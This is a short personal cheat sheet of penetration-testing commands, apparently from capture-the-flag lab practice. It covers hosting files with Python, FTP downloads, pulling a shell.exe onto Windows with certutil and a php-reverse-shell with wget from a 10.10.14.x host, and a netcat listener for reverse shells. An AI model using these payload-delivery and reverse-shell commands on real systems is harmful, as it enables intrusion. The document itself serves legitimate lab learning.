# Past Commands
This contains any commands that I have used in the past that I feel will be helpful in the future so that it is easily accessible.

## Host current directory so files can be downloaded
##### Kali Linux
```python -m SimpleHTTPServer``` (on directory you want to download files from).

## FTP
##### Download file from FTP:

```get <file>``` 

NOTE: ```ascii``` and ```ascii``` modes of ```get```. ```ascii```: transfers files as text. Exampels of files to get using this mode: .txt, .asp, .html, .php, etc. ```binary```: transfers files as raw data. Examples of files to get using this mode: .wav, .jpg, .gif, .mp3, and .mdb files.

## Getting files to Windows via CMD/Powershell
##### Windows 2008, Powershell v2.0 (from pythom -m SimpleHTTPServer)
```
certutil.exe -urlcache -split -f "http://10.10.14.27:8000/shell.exe" shell.exe
```

## Getting files to Linux
##### wget (from python -m SimpleHTTPServer)
```
wget 10.10.14.2:8000/php-reverse-shell.php
```

## Reverse Shells
##### Creating a netcat listener
```
nc -nvlp [port]
```
